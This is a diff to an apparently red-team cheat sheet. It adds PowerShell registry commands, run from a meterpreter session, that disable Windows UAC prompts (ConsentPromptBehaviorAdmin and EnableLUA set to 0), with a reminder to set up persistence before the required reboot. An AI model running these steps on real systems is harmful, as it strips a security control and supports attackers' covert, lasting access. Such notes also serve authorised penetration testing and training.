@@ -153,9 +153,28 @@ meterpreter > powershell_shell
 PS > 
 ````
 ### Change UAC to not Notify
+- Need to be admin 
 ````
+#check registry key first 
+Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+#look for:
+ConsentPromptBehaviorAdmin
+ConsentPromptBehaviorUser
+#Change if it is set to 1 or 2
 Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
 ````
+### Disable LUA 
+- EnableLUA specifies whether Windows User Account Controls (UAC) notifies the user when programs try to make changes to the computer. UAC was formerly known as Limited User Account (LUA).
+````
+#check registry key first 
+Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+#look for:
+EnableLUA   1
+#now set to 0 
+Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
+#will need to restart before changes are applied, thus ensure WMI Event Subscription Persistance or Registry is set up first
+````
+
 ## Persistance Modules 
 - Registry Run Key 
 ````
